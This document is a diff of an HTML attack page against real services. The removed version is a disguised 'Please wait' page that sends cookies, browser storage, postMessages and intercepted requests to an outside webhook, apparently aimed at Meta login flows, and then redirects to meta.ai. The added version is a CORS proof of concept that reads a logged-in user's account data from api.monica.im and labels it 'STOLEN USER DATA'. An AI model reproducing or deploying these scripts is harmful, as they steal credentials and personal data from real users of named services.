@@ -1,115 +1,67 @@
 <!DOCTYPE html>
-<html>
-<head><title>Loading...</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC — monica.im</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 2rem; }
+    h2 { color: #ff4444; }
+    pre { background: #1a1a1a; padding: 1rem; border: 1px solid #333; white-space: pre-wrap; word-break: break-all; }
+    .status { margin: 1rem 0; font-size: 1.2rem; }
+    .ok { color: #00ff00; }
+    .err { color: #ff4444; }
+  </style>
+</head>
 <body>
-<p>Please wait...</p>
-<script>
-(function(){
-  var webhook = "https://eoylavrsjqkz18k.m.pipedream.net";
+  <h2>CORS Misconfiguration PoC — api.monica.im</h2>
+  <p>Target: <code>GET https://api.monica.im/api/user/me</code></p>
+  <p>Origin: <code id="origin"></code></p>
+  <div class="status" id="status">Sending cross-origin request...</div>
+  <pre id="output">Waiting...</pre>
 
-  function send(label, obj) {
-    var payload = JSON.stringify({label: label, data: obj, ts: new Date().toISOString()});
-    navigator.sendBeacon && navigator.sendBeacon(webhook, payload);
-    fetch(webhook, {method:"POST", mode:"no-cors", headers:{"Content-Type":"text/plain"}, body: payload});
-  }
+  <script>
+    document.getElementById('origin').textContent = window.location.origin;
 
-  // 1. Basic capture
-  send("page_load", {
-    url: window.location.href,
-    query: window.location.search,
-    fragment: window.location.hash,
-    referrer: document.referrer,
-    cookies: document.cookie
-  });
+    fetch('https://api.monica.im/api/user/me', {
+      method: 'GET',
+      credentials: 'include',
+      headers: {
+        'X-Client-Type': 'web',
+        'X-Product-Name': 'Monica',
+        'X-Client-Locale': 'en'
+      }
+    })
+    .then(r => {
+      if (!r.ok && r.status !== 200) throw new Error('HTTP ' + r.status);
+      return r.json();
+    })
+    .then(data => {
+      document.getElementById('status').innerHTML =
+        '<span class="ok">✅ CORS BYPASS SUCCESSFUL — victim data read cross-origin</span>';
 
-  // 2. Performance API — redirect chain may contain tokens in intermediate URLs
-  try {
-    var navEntries = performance.getEntriesByType("navigation");
-    if (navEntries.length > 0) {
-      var nav = navEntries[0];
-      send("perf_navigation", {
-        redirectCount: nav.redirectCount,
-        type: nav.type,
-        name: nav.name,
-        transferSize: nav.transferSize,
-        serverTiming: JSON.stringify(nav.serverTiming)
-      });
-    }
-    var resEntries = performance.getEntriesByType("resource");
-    if (resEntries.length > 0) {
-      send("perf_resources", resEntries.map(function(r){ return {name:r.name, type:r.initiatorType}; }));
-    }
-  } catch(e) { send("perf_error", e.message); }
+      const sensitive = {
+        email: data.user?.email,
+        name: data.user?.name,
+        id: data.user?.id,
+        uid: data.user?.uid,
+        country: data.user?.country,
+        auth_platform: data.user?.platform,
+        invite_code: data.user?.invite_code,
+        vip: data.user?.vip_version,
+        created_at: data.user?.created_at
+      };
 
-  // 3. window.opener — if opened as popup, may have access to parent
-  try {
-    if (window.opener) {
-      send("opener_exists", {
-        href: window.opener.location.href,
-        origin: window.opener.origin
-      });
-    } else {
-      send("opener_null", true);
-    }
-  } catch(e) { send("opener_blocked", e.message); }
-
-  // 4. Listen for postMessage from auth.meta.com / facebook.com
-  window.addEventListener("message", function(e) {
-    send("postMessage_received", {
-      origin: e.origin,
-      data: typeof e.data === "object" ? JSON.stringify(e.data) : String(e.data),
-      source_exists: !!e.source
+      document.getElementById('output').textContent =
+        '=== STOLEN USER DATA ===\n\n' +
+        JSON.stringify(sensitive, null, 2) +
+        '\n\n=== FULL RESPONSE ===\n\n' +
+        JSON.stringify(data, null, 2);
+    })
+    .catch(err => {
+      document.getElementById('status').innerHTML =
+        '<span class="err">❌ Request blocked: ' + err.message + '</span>';
+      document.getElementById('output').textContent = err.toString();
     });
-  });
-
-  // 5. Storage events
-  window.addEventListener("storage", function(e) {
-    send("storage_event", {key: e.key, newValue: e.newValue, url: e.url});
-  });
-
-  // 6. Dump all localStorage/sessionStorage
-  try {
-    var ls = {}, ss = {};
-    for (var i = 0; i < localStorage.length; i++) {
-      var k = localStorage.key(i); ls[k] = localStorage.getItem(k);
-    }
-    for (var j = 0; j < sessionStorage.length; j++) {
-      var k2 = sessionStorage.key(j); ss[k2] = sessionStorage.getItem(k2);
-    }
-    if (Object.keys(ls).length || Object.keys(ss).length) {
-      send("storage_dump", {localStorage: ls, sessionStorage: ss});
-    }
-  } catch(e) {}
-
-  // 7. Capture any iframes that load
-  new MutationObserver(function(mutations) {
-    mutations.forEach(function(m) {
-      m.addedNodes.forEach(function(n) {
-        if (n.tagName === "IFRAME") {
-          send("iframe_added", {src: n.src, name: n.name});
-        }
-      });
-    });
-  }).observe(document.documentElement, {childList: true, subtree: true});
-
-  // 8. Override fetch/XMLHttpRequest to intercept any hidden API calls
-  var origFetch = window.fetch;
-  window.fetch = function() {
-    send("fetch_intercepted", {url: arguments[0], method: arguments[1] && arguments[1].method});
-    return origFetch.apply(this, arguments);
-  };
-  var origOpen = XMLHttpRequest.prototype.open;
-  XMLHttpRequest.prototype.open = function() {
-    send("xhr_intercepted", {method: arguments[0], url: arguments[1]});
-    return origOpen.apply(this, arguments);
-  };
-
-  // Don't redirect — stay on page to catch async events (postMessage, etc)
-  // Redirect after 10 seconds to give time for async callbacks
-  setTimeout(function(){
-    window.location.href = "https://meta.ai/";
-  }, 10000);
-})();
-</script>
+  </script>
 </body>
 </html>
